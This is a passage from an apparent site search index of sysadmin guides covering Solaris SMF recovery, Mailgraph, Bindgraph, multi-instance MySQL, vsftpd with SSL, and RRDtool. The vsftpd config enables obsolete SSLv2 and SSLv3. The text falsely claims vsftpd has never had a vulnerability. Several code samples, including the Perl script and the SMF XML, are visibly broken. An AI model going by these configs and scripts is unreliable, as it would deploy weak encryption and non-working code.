then:\nchmod 744 /etc/init.d/filename chgrp sys /etc/init.d/filename Now let’s create the proper links (do this for each desired runlevel): cd /etc/init.d ln filename /etc/rc#.d/S##filename ln filename /etc/rc#.d/K##filename Let’s check: ls -li /etc/init.d/filename ls -li /etc/rc#.d/S##filename ls -li /etc/rc#.d/K##filename Now let’s test: /etc/init.d/filename start Setting Boot Time for Milestones linkHere’s an example:\nsvcadm -v milestone -d multi-user-server:default And the available options:\nall none svc:/milestone/single-user:default svc:/milestone/multi-user:default svc:/milestone/multi-user-server:default Also remember to make a copy of the milestones database:\npstop svc.startd pkill svc.configd cp /etc/svc/repository.db /etc/svc/safe_repository.db cp /lib/svc/seed/global.db /etc/svc/repository.db init 0 ok boot -m verbose FAQ linksvc.configd: smf(5) database integrity check of: /etc/svc/repository.db linkI encountered a message like this after a reboot, thanks UFS. The full message was:\nsvc.configd: smf(5) database integrity check of: /etc/svc/repository.db failed. The database might be damaged or a media error might have prevented it from being verified. Additional information useful to your service provider is in: /etc/svc/volatile/db_errors The system will not be able to boot until you have restored a working database. svc.startd(1M) will provide a sulogin(1M) prompt for recovery purposes. The command: /lib/svc/bin/restore_repository can be run to restore a backup version of your repository. See http://sun.com/msg/SMF-8000-MY for more information. To resolve this issue:\nReboot in failsafe mode (grub) Fix all filesystem fragmentation issues (wizard) Mount your root partition in read/write mode in /a (wizard) Chroot the /a partition: chroot /a /a/bin/bash Run the command /lib/svc/bin/restore_repository and tell it to repair /boot: The following backups of /etc/svc/repository.db exists, from oldest to newest: ... list of backups ... The backups are named based on their type and the time when they were taken. Backups beginning with \"boot\" are made before the first change is made to the repository after system boot. Backups beginning with \"manifest_import\" are made after svc:/system/manifest-import:default finishes its processing. The time of backup is given in YYYYMMDD_HHMMSS format. Please enter one of: 1) boot, for the most recent post-boot backup 2) manifest_import, for the most recent manifest_import backup. 3) a specific backup repository from the above list 4) -seed-, the initial starting repository. (All customizations will be lost.) 5) -quit-, to cancel. Enter response [boot]: Just press Enter here. And confirm by typing yes:\nAfter confirmation, the following steps will be taken: svc.startd(1M) and svc.configd(1M) will be quiesced, if running. /etc/svc/repository.db -- renamed --\u003e /etc/svc/repository.db_old_YYYYMMDD_HHMMSS /etc/svc/volatile/db_errors -- copied --\u003e /etc/svc/repository.db_old_YYYYMMDD_HHMMSS_errors repository_to_restore -- copied --\u003e /etc/svc/repository.db and the system will be rebooted with reboot(1M). Proceed [yes/no]? yes Resources linkSolaris Features: Service Management Facility\nUsing Service Management Facility (SMF)\n"
            }
        );
    index.add(
            {
                id:  455 ,
                href: "\/Mailgraph%C2%A0:%C2%A0Surveillance%C2%A0des%C2%A0mails%C2%A0%28Spams,%C2%A0rejects,%C2%A0virus...%29",
                title: "Mailgraph: Email Monitoring (Spam, Rejects, Viruses...)",
                description: "A guide on installing and configuring Mailgraph to monitor email traffic, spam, viruses and rejected emails on your mail server.",
                content: "Introduction linkMailgraph is a software tool that generates graphs of email statistics such as spam, viruses, and more.\nIt provides a good overview of what’s happening on your mail server.\nMailgraph Official Site\nInstallation linkThe installation is really simple:\napt-get install mailgraph Now you just need to access the interface. On Apache:\nhttp://mysite/cgi-bin/mailgraph.cgi And on Lighttpd:\nhttp://mysite/mailgraph Mailgraph without CGI linkWhether for performance, security, or simplicity reasons, it’s quite common not to have a CGI module on a server (installing CGI with nginx is tedious for example). However, the mailgraph stats tool is only designed to run in CGI. Here is a small script that allows you to generate mailgraph graphs without CGI:\n#!/bin/sh MAILGRAPH_PATH=/usr/lib/cgi-bin/mailgraph.cgi # Debian #MAILGRAPH_PATH=/usr/local/www/cgi-bin/mailgraph.cgi # FreeBSD #MAILGRAPH_PATH=/usr/local/lib/mailgraph/mailgraph.cgi # OpenBSD MAILGRAPH_DIR=/var/www/mailgraph umask 022 mkdir -p $MAILGRAPH_DIR $MAILGRAPH_PATH | sed '1,2d ; s/mailgraph.cgi?//' \u003e $MAILGRAPH_DIR/index.html for i in 0-n 0-e 1-n 1-e 2-n 2-e 3-n 3-e; do QUERY_STRING=$i $MAILGRAPH_PATH | sed '1,3d' \u003e $MAILGRAPH_DIR/$i done This script can be added to crontab, which allows regular saving of the generated graphs. Tested on Debian, FreeBSD and OpenBSD (MAILGRAPH_PATH variable should be adapted).\nFAQ linkNo graphs displaying under Lighttpd linkI encountered this annoying bug where no graphs are displayed. To work around this issue (not in an elegant way), you must edit the file /etc/lighttpd/conf-enabled/50-mailgraph.conf and modify the 2nd line:\n# Alias for phpMyAdmin directory alias.url += ( \"/mailgraph.cgi\" =\u003e \"/usr/lib/cgi-bin/mailgraph.cgi\", ) $HTTP[\"url\"] =~ \"^/mailgraph*\", { } Here “/mailgraph” has been replaced with “/mailgraph.cgi”. Reload your lighttpd configuration and it should work.\nResources linkMailgraph documentation\n"
            }
        );
    index.add(
            {
                id:  456 ,
                href: "\/Bindgraph_:_Avoir_des_stats_et_des_graphs_des_requ%C3%AAtes_DNS\/",
                title: "Bindgraph: Get Statistics and Graphs of DNS Queries",
                description: "How to install and configure Bindgraph to visualize DNS query statistics in graphical form",
                content: "Introduction linkThis is the kind of software I really like. It installs quickly and is very practical.\nInstallation link aptitude install bindgraph Configuration linkLighttpd linkCreate a configuration file for bindgraph in the /etc/lighttpd/conf-available/ directory:\n# Alias for phpMyAdmin directory alias.url += ( \"/bindgraph\" =\u003e \"/usr/lib/cgi-bin/bindgraph.cgi\", ) $HTTP[\"url\"] =~ \"^/bindgraph*\", { } Now, create the necessary symlink:\ncd /etc/lighttpd/conf-enabled ln -s /etc/lighttpd/conf-available/50-bindgraph.conf . All that’s left is to restart the web server and it’s accessible via:\nhttp://myserver/bindgraph\nFAQ linkI have a blank page, why? linkIn the Lighttpd error logs (/var/log/lighttpd/error.log), you might see something like this:\n\"-T\" is on the #! line, it must also be used on the command line at /usr/lib/cgi-bin/bindgraph.cgi line 1. Edit the file /usr/lib/cgi-bin/bindgraph.cgi and remove the letter ‘T’ from the first line so it looks like:\n#!/usr/bin/perl -w That’s it :-)\n"
            }
        );
    index.add(
            {
                id:  457 ,
                href: "\/Lancer_plusieurs_instances_de_MySQL_sur_Solaris\/",
                title: "Running Multiple MySQL Instances on Solaris",
                description: "Guide on how to install and configure multiple MySQL instances on Solaris, including configuration files, initialization, startup scripts, and SMF file creation.",
                content: "Installation linkDownload MySQL\nwget http://dev.mysql.com/get/Downloads/MySQL-5.1/mysql-5.1.41-solaris10-x86_64.pkg.gz/from/http://mir2.ovh.net/ftp.mysql.com/ Create the MySQL user\ngroupadd mysql useradd -g mysql -s /bin/false -d /var/empty mysql Verify that the user is properly created\n# finger mysql Login name: mysql Directory: /var/empty Shell: /bin/sh Never logged in. No unread mail No Plan. Decompress the MySQL archive and install it\ngunzip mysql-5.1.41-solaris10-x86_64.pkg.gz pkgadd -d mysql-5.1.41-solaris10-x86_64.pkg Configuration linkmy.cnf linkCreate two distinct configuration files by changing:\nThe file name The port The socket The datadir Example: /etc/my-prod.cnf\n# The MySQL server [mysqld] port = 3307 socket = /var/lib/mysql/mysql-prod.sock datadir = /mnt/ulprod-ld_mysql/databases log-bin = /mnt/ulprod-ld_mysql/logs/mysql-bin pid-file = /mnt/ulprod-ld_mysql/mysql-prod.pid skip-locking key_buffer = 64M max_allowed_packet = 1M table_cache = 512 sort_buffer_size = 2M read_buffer_size = 2M read_rnd_buffer_size = 8M myisam_sort_buffer_size = 128M thread_cache_size = 8 query_cache_size = 128M query_cache_limit = 2M thread_concurrency = 8 skip-name-resolve innodb_data_file_path=ibdata1:10M:autoextend innodb_buffer_pool_size = 2048M innodb_additional_mem_pool_size = 20M innodb_data_home_dir = /mnt/ulprod-ld_mysql/ innodb_log_group_home_dir = /mnt/ulprod-ld_mysql/ innodb_file_per_table innodb_log_file_size = 256M innodb_log_buffer_size = 8M innodb_flush_log_at_trx_commit = 1 default-storage_engine=InnoDB thread_cache_size = 16 slow_query_log = 1 long_query_time = 1 skip-federated server-id = 1 #log-bin=mysql-bin #sync_binlog = 1 [mysqldump] quick max_allowed_packet = 16M [mysql] no-auto-rehash [isamchk] key_buffer = 256M sort_buffer_size = 256M read_buffer = 2M write_buffer = 2M [myisamchk] key_buffer = 256M sort_buffer_size = 256M read_buffer = 2M write_buffer = 2M [mysqlhotcopy] interactive-timeout Example: /etc/my-dr.cnf\n# The MySQL server [mysqld] port = 3306 socket = /var/lib/mysql/mysql-dr.sock datadir = /mnt/ulprod-pa_mysql/databases log-bin = /mnt/ulprod-pa_mysql/logs/mysql-bin pid-file = /mnt/ulprod-pa_mysql/mysql-dr.pid skip-locking key_buffer = 64M max_allowed_packet = 1M table_cache = 512 sort_buffer_size = 2M read_buffer_size = 2M read_rnd_buffer_size = 8M myisam_sort_buffer_size = 128M thread_cache_size = 8 query_cache_size = 128M query_cache_limit = 2M thread_concurrency = 8 skip-name-resolve innodb_data_file_path=ibdata1:10M:autoextend innodb_buffer_pool_size = 2048M innodb_additional_mem_pool_size = 20M innodb_data_home_dir = /mnt/ulprod-pa_mysql/ innodb_log_group_home_dir = /mnt/ulprod-pa_mysql/ innodb_file_per_table innodb_log_file_size = 256M innodb_log_buffer_size = 8M innodb_flush_log_at_trx_commit = 1 default-storage_engine=InnoDB thread_cache_size = 16 slow_query_log = 1 long_query_time = 1 skip-federated server-id = 1 #log-bin=mysql-bin #sync_binlog = 1 [mysqldump] quick max_allowed_packet = 16M [mysql] no-auto-rehash [isamchk] key_buffer = 256M sort_buffer_size = 256M read_buffer = 2M write_buffer = 2M [myisamchk] key_buffer = 256M sort_buffer_size = 256M read_buffer = 2M write_buffer = 2M [mysqlhotcopy] interactive-timeout Then create the client configuration file to force the use of TCP protocol instead of local socket\nExample: /etc/my.cnf\n[client] protocol = tcp Initializing the Databases linkCreate directories for databases and logs\nmkdir /mnt/ulprod-ld_mysql/{databases,logs} mkdir /mnt/ulprod-pa_mysql/{databases,logs} Initialize the MySQL databases\n/opt/mysql/mysql/scripts/mysql_install_db --user=mysql --ldata=/mnt/ulprod-ld_mysql/databases /opt/mysql/mysql/scripts/mysql_install_db --user=mysql --ldata=/mnt/ulprod-pa_mysql/databases Startup Script linkMake a copy of the startup script for each instance\nmkdir /opt/mysql/mysql/share/mysql cp /opt/mysql/mysql/support-files/mysql.server /opt/mysql/mysql/share/mysql/mysql.server-prod cp /opt/mysql/mysql/support-files/mysql.server /opt/mysql/mysql/share/mysql/mysql.server-dr Edit each of these scripts and modify the line:\n$bindir/mysqld_safe --datadir=$datadir --pid-file=$server_pid_file $other_args \u003e/dev/null 2\u003e\u00261 \u0026 Specify the configuration file to use, and remove “–datadir=$datadir” and “–pid-file=$server_pid_file”. For “mysql.server-prod” file:\n$bindir/mysqld_safe --defaults-file=/etc/my-prod.cnf $other_args \u003e/dev/null 2\u003e\u00261 \u0026 And for “mysql.server-dr”:\n$bindir/mysqld_safe --defaults-file=/etc/my-dr.cnf $other_args \u003e/dev/null 2\u003e\u00261 \u0026 Also comment out the “datadir=” line:\n#datadir=/var/lib/mysql Define the “server_pid_file=” variable by specifying the PID file defined in the configuration. For example:\nserver_pid_file=/mnt/ulprod-pa_mysql/mysql-uat.pid Define the “extra_args=” variable by specifying the configuration file. For example:\nextra_args=\"-c /etc/my-uat.cnf\" SMF File linkCreate 2 SMF files with different names and modify the “exec” line to call the correct script:\nExample: /var/svc/manifest/application/database/mysql-prod.xml\n\u003c?xml version=\"1.0\"?\u003e \u003c!DOCTYPE service_bundle SYSTEM \"/usr/share/lib/xml/dtd/service_bundle.dtd.1\"\u003e MySQL Prod RDBMS 5.0.19 Example: /var/svc/manifest/application/database/mysql-dr.xml\n\u003c?xml version=\"1.0\"?\u003e \u003c!DOCTYPE service_bundle SYSTEM \"/usr/share/lib/xml/dtd/service_bundle.dtd.1\"\u003e MySQL DR RDBMS 5.0.19 Validating SMF Files linkValidate the services with the following command:\nsvccfg validate /var/svc/manifest/application/database/mysql-prod.xml svccfg validate /var/svc/manifest/application/database/mysql-dr.xml If the command returns nothing, everything is perfect!\nNext, import the XML scripts:\nsvccfg import /var/svc/manifest/application/database/mysql-prod.xml svccfg import /var/svc/manifest/application/database/mysql-dr.xml To validate, check that the services are present:\nsvcs mysql-prod svcs mysql-dr Finally, set the proper permissions:\nchown -Rf mysql: /mnt/ulprod-pa_mysql chown -Rf mysql: /mnt/ulprod-ld_mysql chmod -Rf 700 /mnt/ulprod-pa_mysql chmod -Rf 700 /mnt/ulprod-ld_mysql Starting the Services linkAll that’s left is to enable the service:\nsvcadm enable mysql-prod svcadm enable mysql-dr "
            }
        );
    index.add(
            {
                id:  458 ,
                href: "\/Vsftpd_:_Mise_en_place_d%27h%C3%B4tes_virtuels_avec_MySQL\/",
                title: "Vsftpd: Setting up virtual hosts with MySQL",
                description: "This guide explains how to configure vsftpd with virtual hosts using MySQL, including SSL configuration and security settings",
                content: "Introduction linkvsFTPd, short for Very Secure FTP Daemon, is a free, simple, and secure FTP server.\nIt was developed with the best possible security in mind to address vulnerabilities in classic FTP servers.\nIt includes all the standard options of classic FTP servers (ProFTPd, Pure-FTPd, etc.). It supports IPv6 and SSL.\nVsFTPd is an FTP server designed with maximum security in mind. Unlike other FTP servers (ProFTPd, PureFTPd, etc.), no security vulnerability has ever been found in VsFTPd. This server is widely used by large enterprises.\nThe default configuration of VsFTPd is very restrictive:\nOnly anonymous accounts are allowed to connect to the server, and in read-only mode Users can only access their own account VsFTPd features:\nAccessible configuration Virtual users Virtual IP addresses Bandwidth limitation IPv6 Built-in SSL encryption support It is distributed under the terms of the GNU GPL license.\nInstallation linkI’m performing this installation on OpenBSD, so here’s how to proceed:\npkg_add -iv vsftpd Yes, that’s all :-)\nConfiguration linkssl linkWe’ll need a certificate for SSL, so let’s generate one:\nmkdir -p /etc/ssl/vsftpd openssl req -x509 -nodes -days 365 -newkey rsa:2048 -keyout /etc/ssl/vsftpd/vsftpd.pem -out /etc/ssl/vsftpd/vsftpd.pem And then we set the proper permissions:\nchown root:root /etc/ssl/vsftpd/vsftpd.pem chmod 600 /etc/ssl/vsftpd/vsftpd.pem vsftpd linkFor the configuration, I want all users to be chrooted and SSL to be used at all levels (connections + data). Here’s my config (/etc/vsftpd.conf):\n# Example config file /etc/vsftpd.conf # # The default compiled in settings are fairly paranoid. This sample file # loosens things up a bit, to make the ftp daemon more usable. # Please see vsftpd.conf.5 for all compiled in defaults. # # READ THIS: This example file is NOT an exhaustive list of vsftpd options. # Please read the vsftpd.conf.5 manual page to get a full idea of vsftpd's # capabilities. # # Standalone mode listen=YES # # SSL ssl_enable=YES #allow_anon_ssl=NO force_local_data_ssl=NO force_local_logins_ssl=YES ssl_tlsv1=YES ssl_sslv2=YES ssl_sslv3=YES rsa_cert_file=/etc/ssl/vsftpd/vsftpd.pem rsa_private_key_file=/etc/ssl/vsftpd/vsftpd.pem # # TCP Wrappers #tcp_wrappers=YES # # Allow anonymous FTP? (Beware - allowed by default if you comment this out). anonymous_enable=NO # # Uncomment this to allow local users to log in. local_enable=YES # # Uncomment this to enable any form of FTP write command. write_enable=YES # # Default umask for local users is 077. You may wish to change this to 022, # if your users expect that (022 is used by most other ftpd's) local_umask=022 # # Uncomment this to allow the anonymous FTP user to upload files. This only # has an effect if the above global write enable is activated. Also, you will # obviously need to create a directory writable by the FTP user. #anon_upload_enable=YES # # Uncomment this if you want the anonymous FTP user to be able to create # new directories. #anon_mkdir_write_enable=YES # # Activate directory messages - messages given to remote users when they # go into a certain directory. dirmessage_enable=YES # # Activate logging of uploads/downloads. xferlog_enable=YES # # Make sure PORT transfer connections originate from port 20 (ftp-data). connect_from_port_20=YES # # If you want, you can arrange for uploaded anonymous files to be owned by # a different user. Note! Using \"root\" for uploaded files is not # recommended! #chown_uploads=YES #chown_username=whoever # # You may override where the log file goes if you like. The default is shown # below. xferlog_file=/var/log/vsftpd.log # # If you want, you can have your log file in standard ftpd xferlog format #xferlog_std_format=YES # # You may change the default value for timing out an idle session. idle_session_timeout=600 # # You may change the default value for timing out a data connection. #data_connection_timeout=120 # # It is recommended that you define on your system a unique user which the # ftp server can use as a totally isolated and unprivileged user. nopriv_user=_vsftpd # # Enable this and the server will recognise asynchronous ABOR requests. Not # recommended for security (the code is non-trivial). Not enabling it, # however, may confuse older FTP clients. #async_abor_enable=YES # # By default the server will pretend to allow ASCII mode but in fact ignore # the request. Turn on the below options to have the server actually do ASCII # mangling on files when in ASCII mode. # Beware that on some FTP servers, ASCII support allows a denial of service # attack (DoS) via the command \"SIZE /big/file\" in ASCII mode. vsftpd # predicted this attack and has always been safe, reporting the size of the # raw file. # ASCII mangling is a horrible feature of the protocol. #ascii_upload_enable=YES #ascii_download_enable=YES # # You may fully customise the login banner string: ftpd_banner=Deimos FTP Server # # You may specify a file of disallowed anonymous e-mail addresses. Apparently # useful for combatting certain DoS attacks. #deny_email_enable=YES # (default follows) #banned_email_file=/etc/vsftpd.banned_emails # # You may specify an explicit list of local users to chroot() to their home # directory. If chroot_local_user is YES, then this list becomes a list of # users to NOT chroot(). chroot_list_enable=YES chroot_local_user=YES # (default follows) chroot_list_file=/etc/ftpchroot # # You may activate the \"-R\" option to the builtin ls. This is disabled by # default to avoid remote users being able to cause excessive I/O on large # sites. However, some broken FTP clients such as \"ncftp\" and \"mirror\" assume # the presence of the \"-R\" option, so there is a strong case for enabling it. #ls_recurse_enable=YES # # If enabled, vsftpd will load a list of usernames from the filename # given by userlist_file. If a user tries to log in using a name in this # file, they will be denied before they are asked for a password. # This may be useful in preventing clear text passwords being transmitted. userlist_enable=YES # # This option is the name of the file loaded when the userlist_enable # option is active. userlist_file=/etc/ftpusers # # This option should be the name of a directory which is empty. Also, # the directory should not be writable by the ftp user. This directory # is used as a secure chroot() jail at times vsftpd does not require # filesystem access. secure_chroot_dir=/var/empty pasv_enable=YES # # The minimum port to allocate for PASV style data connections. # Can be used to specify a narrow port range to assist firewalling. pasv_min_port=49152 # # The maximum port to allocate for PASV style data connections. # Can be used to specify a narrow port range to assist firewalling. pasv_max_port=65535 # # By default, numeric IDs are shown in the user and group fields of # directory listings. You can get textual names by enabling this parameter. # It is off by default for performance reasons. text_userdb_names=YES Launching linkThere are several ways to launch it. To test, you can simply run the vsftpd command:\nvsftpd \u0026 Once everything is working as you want, it’s best to couple it with inetd or xinetd.\nResources linkHere are some documents covering VSFTP in various forms: Virtual Hosting with vsftpd and MySQL Four highly secure FTP servers with vsftpd\n"
            }
        );
    index.add(
            {
                id:  459 ,
                href: "\/RRDtool_:_cr%C3%A9er_ses_propre_graphiques_avec_RRDtool\/",
                title: "RRDtool: Create Your Own Graphics with RRDtool",
                description: "Learn how to create, manage and generate graphs with RRDtool to visualize your data such as disk usage, temperature, and more.",
                content: " Introduction linkRRDtool is a Round-Robin Database (RRD) management tool created by Tobi Oetiker. It is used by many open source tools, such as Cacti, collectd, Lighttpd, and Nagios, for saving cyclical data and plotting chronological data graphs. This tool was created to monitor server data, such as bandwidth and CPU temperature. The main advantage of an RRD database is its fixed size.\nRRDTool also includes a tool to graphically represent the data contained in the database. RRDTool is free software distributed under the terms of the GNU GPL.\nI had to use RRD to graph disk usage of several user folders (e.g., /home/users/*).\nOverview of how RRDtool works: Create an empty RRD database that will contain the data to graph Update RRD data using the “rrdtool update” command or via a script Generate graphs with the “rrdtool graph” command Managing an RRD Database linkThe RRD database uses a defined number of records. Each addition is placed at the head of the database and the others gradually shift, and so on. There can therefore be no overflow since it’s controlled. The only issue with all this is that you need to know the number of records you want to keep. For example, you may want a day or a month, which are not the same.\nCreating a Database linkFirst, let’s create the database:\n\u003e rrdtool create temptrax.rrd \\ --start N --step 300 \\ DS:probe1-temp:GAUGE:600:55:95 \\ DS:probe2-temp:GAUGE:600:55:95 \\ DS:probe3-temp:GAUGE:600:55:95 \\ DS:probe4-temp:GAUGE:600:55:95 \\ RRA:MIN:0.5:12:1440 \\ RRA:MAX:0.5:12:1440 \\ RRA:AVERAGE:0.5:1:1440 With the create argument, RRDtool will create the database that will contain all the necessary fields. This database doesn’t contain any data yet. Then:\ntemptrax.rrd: this is the name of the database and its location –start N: gives an indication of when the graph starts. Here I use N to say now. But I can use a date in epoch format. –step 300: indicates the interval time in seconds when data will arrive in the database (here 5 min) DS: specifies the different data sources. Here I have 4 temperature probes followed by the name (DS-Name) I want to assign them. GAUGE: This is a DST (Data Source Type). There are several of them: DST Type Description GAUGE This is the most common, and generally the best choice COUNTER This is a counter that will increment continuously DERIVE Will record the drift of the previous and next values ABSOLUTE Records values and resets them after each reading 600:55:95: These last three fields mean: 600: The minimum heartbeat in seconds (after this delay, the value will become unknown if the database has not received anything during this period) 55: Minimum possible value (outside of which the value will be unknown) 95: Maximum possible value (outside of which the value will be unknown) For these two values above, if you don’t know what to put, use ‘U’ for unknown (e.g., DS:probe1-temp:GAUGE:600:U:U)\nRRA: RRA stands for Round Robin Archives. These are like views in which data will be stored. In each RRD database, RRAs are stored separately with a defined number of records. With each new record in the database, a PDP (Primary Data Point) is added which will be combined with it and placed in our RRA in a CF (Consolidation Function). It will determine the current value to write. MIN: This is the type of CF we use. There are others such as: CF Type AVERAGE MIN MAX LAST 0.5: This is an XFF (XFiles Factor) which is a percentage of PDPs that can be unknown without receiving unknown values. 12: This is the number of PDPs that will make up the recorded value. 1440: This is the number of records that the RRA should contain. To summarize: I create an RRD database called temptrax.rrd which will:\nstart now be updated every 5 minutes Additionally:\nI have 4 different data sources with 1 probe of type GAUGE. If my data source is not updated at least every 10 minutes and the value is not between 55 and 95, then the value will be unknown. I also have 3 types of RRA:\n2 are for min and max values using 12 PDPs allowing 50% of them to be unknown We can record up to 1440 records Knowing that we normally update every 5 min, and we use 12 PDPs (each update is a PDP). This means that:\nwe add one record every hour (5 mins * 12) we make 1440 records This gives us 60 days (1440/24h) of RRA. Each min and max value collected in PDP will be used as a value for the RRA.\nIn the last RRA, we use an average of collected PDPs, allowing 50% unknown, but we use only one PDP per record (so each update). We make 1440 records which means this RRA will record (1440/12 updates per hour/24h) 5 days of data. In a future case, we will see that with a simple PDP, the CF is not very important and you will probably have used LAST.\nUpdating a Database linkUpdating can be very simple or very complicated depending on the type of graphs. For usage, however, it is very simple and takes this form:\nrrdtool update timestamp:val1[:val2:...] Generally this command is placed at the end of a script that has retrieved all the data via SNMP or other means to pass a return result as an argument. If we break down the command, it gives us:\n: the location with the rrd file timestamp: the update time (as above, “N” means now) val1[:val2:…]: the values are separated by “:” and there must be as many as declared DS and in order! Here is a crude example to update data:\n#!/usr/bin/perl # RRD Update Script: update_rrd_temps.pl $HOST = \"10.10.0.90\"; $PATH = \"/home/benr/RRD/TempTrax-RRD\"; $NumProbes = 4; for($i=1; $i \u003c= $NumProbes; $i++) { $x = `${PATH}/check_temptraxe -H ${HOST} -p ${i}`; $x =~ s/^.*([0-9.]{4}).*$/$1/; chomp($x); push(@TEMPS,$x); } `/usr/local/rrdtool-1.0.48/bin/rrdtool update ${PATH}/temptrax.rrd \"N:$TEMPS[0]:$TEMPS[1]:$TEMPS[2]:$TEMPS[3]\"`; Additionally, you will need to set up this kind of script in crontab to automatically update the data. Otherwise, you can create a loop to update (a bit cruder).\nModifying the Data Insertion Order linkIf you want to change the order of data insertion, you can do this:\nrrdtool update --template ds2:ds1:ds3 However, remember that data already inserted has been entered in a specific order, if you change it, the graph history will be incorrect.\nGenerating Graphs linkWe will use rrdtool graph to generate a graph from our rrd database. There are tons of options for this command. We will only see the basics here. Here’s what we’re going to run:\n\u003e rrdtool graph mygraph.png -a PNG --title=\"TempTrax\" \\ --vertical-label \"Deg F\" \\ 'DEF:probe1=temptrax.rrd:probe1-temp:AVERAGE' \\ 'DEF:probe2=temptrax.rrd:probe2-temp:AVERAGE' \\ 'DEF:probe3=temptrax.rrd:probe3-temp:AVERAGE' \\ 'DEF:probe4=temptrax.rrd:probe4-temp:AVERAGE' \\ 'LINE1:probe1#ff0000:Switch Probe' \\ 'LINE1:probe2#0400ff:Server Probe' \\ 'AREA:probe3#cccccc:HVAC' \\ 'LINE1:probe4#35b73d:QA Lab Probe' \\ 'GPRINT:probe1:LAST:Switch Side Last Temp\\: %2.1lf F' \\ 'GPRINT:probe3:LAST:HVAC Output Last Temp\\: %2.1lf F\\j' \\ 'GPRINT:probe2:LAST:Server Side Last Temp\\: %2.1lf F' \\ 'GPRINT:probe4:LAST:QA Lab Last Temp\\: %2.1lf F\\j' To eventually get this:\nLet’s break down what this does:\nmygraph.png: path and name of the graph to generate -a PNG: type of image file to generate. By default it’s gif, but you can force PNG or GD. –title: The title to display at the top of the graph –vertical-label: Name to give the Y axis DEF: These are just virtual names (vname) that we give to DS. It is strongly recommended to use vnames! Indeed, since we can use multiple RRD databases to make a graph, if we have DS with the same name, there will be undesirable effects. probe1: name of the vname temptrax.rrd: rrd database to process rrd:probe1-temp: the name of the original DS AVERAGE: The type of CF we are interested in specified in the RRA LINE1|AREA: These are the type of graph we want to make. For more examples click here to see available graphs. probe4: the corresponding vname #35b73d: Curve color in hexadecimal format QA Lab Probe: Legend name displayed at the bottom of the graph GPRINT: These lines allow additional information to be placed at the bottom of the graph. It is generally nice to see the probe1: the corresponding vname LAST: This is the last CF data in the database (because I use LAST) Switch Side Last Temp:: This is the line to be displayed at the bottom of the graph %2.1lf: used to display a numeric value with 1 decimal place (see the documentation for printf or sprintf for all possibilities) \\j: allows right alignment Different Types of Graphs link LINE type graph: You can specify several types of lines (LINE1, LINE2, LINE3, LINE4). The higher this number, the more the corresponding line will be above lines of lower numbers.\nAREA type graph: AREA allows you to fill the lower part of the graphs.\nSTACK type graph: Allows you to stack the graphs.\nGenerating Historical Graphs linkThe concept is quite simple. Our initial RRD database must collect sufficient time for us to make the graphs we are interested in (e.g., we need at least 3 weeks in the database if we want to make graphs over 3 weeks of history).\nHowever, we will use 2 new arguments: –start and –end. By default, graphs are made over 24 hours. By adding these parameters, we can specify a start and end:\n–end: by default it’s now. And it is generally practical to leave the default. –start: This is the start date of the graph which can be specified in several formats: epoch: you can specify the date in seconds since January 1, 1970 days: you can specify a day of the week “monday” for example weeks: you can ask for the last 2 weeks “-2weeks” month: you can ask for last month “-1month” year: And finally, the year “-1year” In short, the notation is relatively easy as you can see. Check the man page for rrdfetch if you want more info.\nExample linkHere’s an example I propose of something I developed to have graphs on the size occupied by users on their home directory (this is very similar to my documentation on OpenChart). This will give me something like this:\nCreating the RRD Database linkAll my scripts are stored in a folder /etc/scripts/. So if you want to play copy/paste, create this folder.\nSo we’ll create the database like this:\n#!/bin/sh rrdtool create /etc/scripts/rrd_db.rrd \\ --start N --step 300 \\ DS:user1:GAUGE:750:U:U \\ DS:user2:GAUGE:750:U:U \\ DS:user3:GAUGE:750:U:U \\ DS:user4:GAUGE:750:U:U \\ RRA:MIN:0.5:12:720 \\ RRA:MAX:0.5:12:720 \\ RRA:AVERAGE:0.5:12:720 Adapt the part of user names and RRD database (/stats/rrd_db.rrd) to what you want.\nGenerating a Data File linkNext we’ll make a small script that will generate a data file that can be picked up by OpenChart and RRD (well, something a bit generic and easy to parse).\nAgain, adapt the users, user colors, source and destination:\n#!/usr/bin/perl -w use strict; no strict \"refs\"; # Set folder containing all users folder my $source='/home'; my $destination='/var/www/.stats/datas'; # Set all users my @users = ( 'user1', 'user2', 'user3', 'user4' ); # Set color per user my @colors = ( '#000000', '#2d9409', '#4e5fff', '#de1000' ); # Size per user my @ksize; my @printable_size; # Get total size sub get_total_size { my $good_size; open (GET_TOTAL_SIZE, \"df -k $source |\") or die (\"Can't get full size of $source\\n\"); while () { if (/\\S+\\s*(\\d*)\\s*(\\d*).*$source/) { push @users, 'disponible'; push @colors, '#ffffff'; return ($1, $2); } } close (GET_TOTAL_SIZE); } # Calcul userspace size for each users sub get_users_size { my $good_size; my $total_size=shift; my $ref_users=shift; my @users=@$ref_users; foreach (@users) { if (-d \"$source/$_\") { open (GET_SIZE, \"du -sk $source/$_ |\"); while () { chomp $_; if (/(\\d*)\\s*(\\w*)/) { if (($1 / 1024) \u003e= 1000) { # Set Go $good_size = sprintf (\"%.1fGo\", ($1 / 1048576)); push @printable_size, $good_size; push @ksize, $1; } else { # Set Mo $good_size = sprintf (\"%.0fMo\", ($1 / 1024)); push @printable_size, $good_size; push @ksize, $1; } } else { $good_size = sprintf (\"%.0f\", ($1 / $total_size) * 100); push @ksize, $1; } } close (GET_SIZE); } else { push @ksize, 0; push @printable_size, '0Mo'; } } } sub get_free_size { my $total_size=shift; my $busy_size=shift; my $ref_ksize=shift; my @ksize=@$ref_ksize; my $used_ksize=0; sub print_size { my $good_size; if (($_[0] / 1024) \u003e= 1000) { # Set Go $good_size = sprintf (\"%.1fGo\", ($_[0] / 1048576)); push @printable_size, $good_size; } else { # Set Mo $good_size = sprintf (\"%.0fMo\", ($_[0] / 1024)); push @printable_size, $good_size; } } foreach (@ksize) { $used_ksize += $_; } # Delete free space values pop @ksize; pop @printable_size; # Add others if needed my $unknow_ksize = ($busy_size - $used_ksize) / 1024; if ($unknow_ksize \u003e 1024) { push @users, 'autres'; $unknow_ksize = sprintf (\"%.0f\", $unknow_ksize); # Free size my $free_size = ($total_size - $busy_size); push @ksize, $free_size; \u0026print_size($free_size); # Other size push @ksize, $unknow_ksize; \u0026print_size($unknow_ksize); push @colors, '#ff6600'; } return @ksize; } # Write datas sub write_datas_file { my $ref_users=shift; my $ref_ksize=shift; my $ref_printable_size=shift; my $ref_colors=shift; my @users=@$ref_users; my @ksize=@$ref_ksize; my @printable_size=@$ref_printable_size; my @colors=@$ref_colors; open (DATAW, \"\u003e$destination\") or die \"Can't write $destination file : $! my $i=0; foreach (@users) { print DATAW \"$users[$i]:$ksize[$i]:$printable_size[$i]:$colors[$i]\\n $i++; } close (DATAW); } # Get total partition size and busy size my ($total_size, $busy_size)=\u0026get_total_size; 